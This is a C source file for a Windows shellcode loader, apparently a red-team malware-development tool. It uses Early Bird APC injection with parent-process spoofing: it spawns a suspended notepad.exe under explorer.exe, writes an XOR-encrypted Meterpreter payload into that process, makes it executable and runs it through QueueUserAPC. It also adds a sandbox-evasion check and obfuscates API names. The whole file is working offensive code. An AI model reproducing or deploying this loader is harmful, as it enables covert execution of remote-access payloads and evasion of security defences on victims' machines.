

#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <tlhelp32.h>
#include <string.h>
#include "funcCall.h"
#include "structsFunc.h"


unsigned char payload[] = { 0x0 }; //put your xor encrypted meterpreter payload here
char key[] = "";// put the key to decrypt your payload here
SIZE_T payload_len = sizeof(payload);
SIZE_T payload_len2 = sizeof(payload);
NTSTATUS success;

int main(int argc, char* argv[])
{
	//simple sandbox evasion trick
	if (strstr(argv[0], "EarlyBirdNTDLL.exe") == 0)
	{
		return 0;
	}

	int pid;
	HANDLE hProc = NULL;

	//STARTUPINFO si;
	STARTUPINFOEX si = { sizeof(si) };
	PROCESS_INFORMATION pi;
	SIZE_T attributeSize;
	LPVOID pRemoteCode = NULL;
	//void* pRemoteCode;
	//taken from https://captmeelo.com/redteam/maldev/2021/11/22/picky-ppid-spoofing.html
	InitializeProcThreadAttributeList(NULL, 1, 0, &attributeSize);
	si.lpAttributeList = (LPPROC_THREAD_ATTRIBUTE_LIST)HeapAlloc(GetProcessHeap(), 0, attributeSize);
	InitializeProcThreadAttributeList(si.lpAttributeList, 1, 0, &attributeSize);

	pid = FindTarget();
	printf("Explorer PID: %d\n", pid);
	OBJECT_ATTRIBUTES oa;
	oa = { sizeof(oa) };
	CLIENT_ID clientId = { (HANDLE)pid, NULL };
	// strings
	WCHAR masterDLL[] = { 'n','t','d','l','l','.','d','l','l',0 };
	char Op3npr0[] = { 'N','t','O','p','e','n','P','r','o','c','e','s','s',0 };
	WCHAR k3rn3l[] = { 'K','e','r','n','e','l','3','2','.','d','l','l',0 };
	char qu3u3[] = { 'Q','u','e','u','e','U','s','e','r','A','P','C',0 };

	myNtOpenProcess pOpenProcess = (myNtOpenProcess)hlpGetProcAddress(hlpGetModuleHandle(masterDLL), Op3npr0);
	NTSTATUS p = pOpenProcess(&hProc, PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION |
		PROCESS_VM_OPERATION | PROCESS_VM_READ | PROCESS_VM_WRITE | PROCESS_CREATE_PROCESS, &oa, &clientId); //PROCESS_CREATE_PROCESS is necessary for PPID spoofing
	if (hProc != NULL && p == 0x00000000)
		printf("[+] Handle to process obtained!!\n");

	if (UpdateProcThreadAttribute(si.lpAttributeList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, &hProc, sizeof(HANDLE), NULL, NULL) != 0)
		printf("Process props updated\n");
	si.StartupInfo.cb = sizeof(STARTUPINFOEX);
	/*
	ZeroMemory(&si, sizeof(si));
	si.cb = sizeof(si);
	ZeroMemory(&pi, sizeof(pi));
	*/

	// EXTENDED_STARTUPINFO_PRESENT is necessary for PPID spoofing
	if (CreateProcessA(0, (LPSTR)"notepad.exe", 0, 0, TRUE, CREATE_SUSPENDED | EXTENDED_STARTUPINFO_PRESENT, 0, 0, (LPSTARTUPINFOA)&si, &pi) == 0)
		printf("Failed to create process. Error code: %u", GetLastError());

	//XOR((char*)payload, payload_len, (char*)key, sizeof(key));
	char alloc[] = { 'N','t','A','l','l','o','c','a','t','e','V','i','r','t','u','a','l','M','e','m','o','r','y',0 };
	myNtAllocateVirtualMemory pAllocMem = (myNtAllocateVirtualMemory)hlpGetProcAddress(hlpGetModuleHandle(masterDLL), alloc);
	success = pAllocMem(pi.hProcess, &pRemoteCode, 0, &payload_len, MEM_COMMIT, PAGE_READWRITE); // we allocate buffer for our payload
	if (success == 0x00000000)
		printf("PID: %d\n[+] RW buffer created: %p\n", pi.dwProcessId, pRemoteCode);

	XOR((char*)payload, payload_len2, (char*)key, sizeof(key));


	char write[] = { 'N','t','W','r','i','t','e','V','i','r','t','u','a','l','M','e','m','o','r','y',0 };
	myNtWriteVirtualMemory pWriteMem = (myNtWriteVirtualMemory)hlpGetProcAddress(hlpGetModuleHandle(masterDLL), write);
	success = pWriteMem(pi.hProcess, pRemoteCode, (PVOID)payload, payload_len, (SIZE_T*)NULL); //we copy our payload to the buffer
	//printf("[+] myNtWriteVirtualMemory failed! Last error: %u\n", GetLastError());
	printf("Location of remote code: %p\n", pRemoteCode);
	if (success == 0x00000000)
		printf("[+] Payload successfully copied\n");

	char protect[] = { 'N','t','P','r','o','t','e','c','t','V','i','r','t','u','a','l','M','e','m','o','r','y',0 };
	myNtProtectVirtualMemory pVirtualProtect = (myNtProtectVirtualMemory)hlpGetProcAddress(hlpGetModuleHandle(masterDLL), protect);
	DWORD old = 0;
	success = pVirtualProtect(pi.hProcess, &pRemoteCode, (PULONG)&payload_len, PAGE_EXECUTE_READ, &old); //we make the remote buffer RX
	if (success == 0x00000000)
		printf("[+] Permissions changed to RX\n");

	myQueueUserAPC pQueueUserAPC = (myQueueUserAPC)hlpGetProcAddress(hlpGetModuleHandle(k3rn3l), qu3u3);
	if (!pQueueUserAPC((PAPCFUNC)pRemoteCode, pi.hThread, NULL))
		printf("QueueUserAPC Failed");
	//QueueUserAPC((PAPCFUNC)pRemoteCode, pi.hThread, NULL);

	printf("pload = %p ; remcode = %p\n", payload, pRemoteCode);
	//getchar();
	ResumeThread(pi.hThread);

	return 0;
}

